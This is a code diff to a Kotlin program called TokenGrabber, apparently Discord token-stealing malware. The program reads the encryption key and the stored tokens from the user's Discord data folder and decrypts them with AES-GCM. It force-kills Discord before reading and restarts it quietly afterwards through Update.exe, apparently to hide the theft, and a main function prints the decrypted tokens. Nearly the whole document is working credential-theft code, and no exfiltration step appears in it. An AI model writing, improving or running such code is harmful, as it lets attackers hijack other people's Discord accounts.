@@ -9,6 +9,7 @@ import java.io.File
 import java.io.FileReader
 import java.io.InputStreamReader
 import java.util.*
+import java.util.regex.Pattern
 import javax.crypto.Cipher
 import javax.crypto.spec.GCMParameterSpec
 import javax.crypto.spec.SecretKeySpec
@@ -16,8 +17,8 @@ import javax.crypto.spec.SecretKeySpec
 object TokenGrabber {
     val romaing = System.getenv("APPDATA")
 
-    fun getTokens(): List<String>? {
-        killProcess()
+    fun getTokens(): List<String>? { // TODO: forced / non-forced (via args)
+        val wasRunning = killProcess()
 
         val key = getKey()
         val tokens = getTokensFromFile()
@@ -28,6 +29,9 @@ object TokenGrabber {
             val y = z.copyOfRange(5, z.size)
             decryptedTokens.add(decrypt(Base64.getDecoder().decode(s), y))
         }
+
+        if (wasRunning) restartProcess()
+
         return decryptedTokens
     }
 
@@ -73,16 +77,53 @@ object TokenGrabber {
         return String(cipher.doFinal(data))
     }
 
-    private fun killProcess() {
+    private fun killProcess(): Boolean {
         try {
             val process = ProcessBuilder("tasklist").start()
             val reader = BufferedReader(InputStreamReader(process.inputStream))
-            reader.lines().anyMatch { it.contains("discord", ignoreCase = true) }
+            if (reader.lines().anyMatch { it.contains("Discord") }) {
+                ProcessBuilder("taskkill", "/F", "/IM", "discord.exe").start().waitFor()
+                return true
+            }
 
-            ProcessBuilder("taskkill", "/F", "/IM", "discord.exe").start().waitFor()
-        } catch (e: Exception) {
-            e.printStackTrace()
-            false
+        } catch (_: Exception) {}
+        return false
+    }
+
+    private fun restartProcess() {
+        val dir = System.getProperty("user.home") + "/AppData/Local/Discord"
+        val update = "$dir/Update.exe"
+        var executable = "Discord.exe"
+
+        val directory = File(System.getProperty("user.home") + "/AppData/Local/Discord")
+        if (directory.exists() && directory.isDirectory) {
+            val appPattern = Pattern.compile("app-+?")
+            directory.listFiles()?.forEach { file ->
+                if (appPattern.matcher(file.name).find()) {
+                    val app = file.path
+                    val modulesDir = File(app, "modules")
+                    if (modulesDir.exists()) {
+                        File(app).listFiles()?.forEach { innerFile ->
+                            if (innerFile.name == executable) {
+                                executable = File(app, executable).path
+                                // Start the process
+                                try {
+                                    ProcessBuilder(update, "--processStart", executable)
+                                        .redirectErrorStream(true)
+                                        .start()
+                                        .waitFor()
+                                } catch (e: Exception) {
+                                    println("Error starting Discord: ${e.message}")
+                                }
+                            }
+                        }
+                    }
+                }
+            }
         }
     }
+}
+
+fun main() {
+    println(TokenGrabber.getTokens())
 }
